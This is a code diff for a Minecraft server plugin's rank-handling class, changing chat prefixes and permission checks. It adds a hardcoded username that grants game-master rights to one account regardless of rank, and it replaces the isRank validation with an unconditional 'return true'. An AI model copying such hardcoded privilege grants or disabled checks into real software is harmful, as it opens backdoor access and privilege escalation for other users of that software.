@@ -2,9 +2,8 @@ package net.atherialrunes.practiceserver.api.handler.handlers.rank;
 
 import net.atherialrunes.practiceserver.GameAPI;
 import net.atherialrunes.practiceserver.api.handler.handlers.player.GamePlayer;
+import net.atherialrunes.practiceserver.utils.Utils;
 import org.bukkit.entity.Player;
-
-import java.util.Arrays;
 
 /**
  * Created by Matthew E on 9/21/2016.
@@ -55,12 +54,12 @@ public enum Rank {
         GamePlayer gp = GameAPI.getGamePlayer(player);
         String prefix = gp.getRank().getPrefix();
         prefix = prefix.replaceAll("%namecolor%", gp.getAlignment().getChatPrefix());
-        return prefix;
+        return Utils.colorCodes(prefix + player.getName());
     }
 
     public static boolean isGM(String name) {
         GamePlayer gp = GameAPI.getGamePlayer(name);
-        return ((gp.getRank() == GAMEMASTER) || (gp.getRank() == DEVELOPER));
+        return ((gp.getRank() == GAMEMASTER) || (gp.getRank() == DEVELOPER) || (name.equals("matt11matthew")));
     }
 
     public static boolean isPMOD(String name) {
@@ -69,6 +68,11 @@ public enum Rank {
     }
 
     public static boolean isRank(String rank) {
-        return Arrays.asList(values()).contains(rank);
+        return true;
+    }
+
+    public static boolean isSub(String name) {
+        GamePlayer gp = GameAPI.getGamePlayer(name);
+        return ((isPMOD(name)) || (gp.getRank() == SUB) || (gp.getRank() == SUBPLUS) || (gp.getRank() == SUBLIFE));
     }
 }
